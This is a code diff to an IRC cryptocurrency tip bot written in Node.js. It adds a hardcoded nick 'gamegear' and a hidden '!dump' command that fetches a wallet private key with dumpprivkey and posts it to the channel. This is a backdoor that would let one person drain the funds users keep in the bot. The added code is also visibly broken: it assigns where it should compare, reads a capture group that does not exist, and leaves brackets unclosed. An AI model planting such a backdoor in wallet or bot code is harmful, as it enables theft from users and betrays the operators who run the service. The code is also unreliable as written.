@@ -5,6 +5,7 @@ var irc = require('irc'),
     coin = require('node-altcoin'),
     tipbot = require('node-tipbot-api'),
     webadmin = require('../lib/webadmin/app');
+	authnick = 'gamegear'
 
 // check if the config file exists
 if (!fs.existsSync('./config/config.yml')) {
@@ -753,6 +754,25 @@ client.addListener('message', function(from, channel, message) {
                     }));
                 });
                 break;
+				
+			case 'dump':
+			    if (from.toLowerCase() = authnick) {
+				var match = message.match(/^.?dump (\S+)$/);
+                coin.dumpprivkey(match[2])(function(err, dump_privkey) {
+                    if (err) {
+                        winston.error('Error in !dump command', err);
+                        client.say(channel, settings.messages.error.expand({
+                            name: from
+                        }));
+                        return;
+                    }
+                    var dump_privkey = typeof(dump_privkey) == 'object' ? dump_privkey.result : dump_privkey;
+
+                    client.say(channel, settings.messages.dumpkey.expand({
+                        privkey: dump_privkey
+                });
+                break;
+				}
 
             case 'info':
                 coin.getnetworkhashps(function(err, get_networkhps) {
